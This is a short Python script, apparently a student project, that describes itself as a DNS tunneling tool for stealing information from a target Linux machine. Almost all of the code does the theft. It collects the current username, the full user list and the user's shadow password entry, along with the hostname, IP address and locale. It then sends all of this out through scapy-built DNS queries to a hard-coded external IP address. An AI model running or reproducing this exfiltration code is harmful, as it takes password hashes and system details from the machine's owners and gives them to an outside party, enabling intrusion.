# Project made by: Dana Zorohov , Nir Meir 

"""
----DNS Tunneling script----
Stealing info from a target machine and sending it to our machine using DNS tunneling.

WORKS ONLY ON LINUX MACHINE!
"""

# IMPORTS
import pwd
import spwd
import locale
from scapy.all import *
import socket
from scapy.layers.dns import DNS, DNSQR
from scapy.layers.inet import IP, UDP


# get current user
print(os.getlogin())
username=os.getlogin()

# get all users
(pwd. getpwall())

# get password of the current user
(spwd.getspnam(username))

# get IP,OS version
hostname = socket.gethostname()
IPAddr = socket.gethostbyname(hostname)

# get available languages
locale.setlocale(locale.LC_ALL, "")
message_language = locale.getlocale(locale.LC_MESSAGES)[0]

# sending all the above using DNS queries
dns_req_1 = IP(dst='212.179.179.104')/UDP(dport=53)/DNS(rd=1, qd=DNSQR(qname=f"Current user: {username} + Password: {(spwd.getspnam(username))} "))
dns_req_2 = IP(dst='212.179.179.104')/UDP(dport=53)/DNS(rd=1, qd=DNSQR(qname=f"Host: {hostname} + IP: {IPAddr}+{message_language}"))
dns_req_3 = IP(dst='212.179.179.104')/UDP(dport=53)/DNS(rd=1, qd=DNSQR(qname=f"All Users: {(pwd. getpwall())}"))

send(dns_req_1, verbose=0)
send(dns_req_2, verbose=0)
send(dns_req_3, verbose=0)

print("DNS tunneling successful")

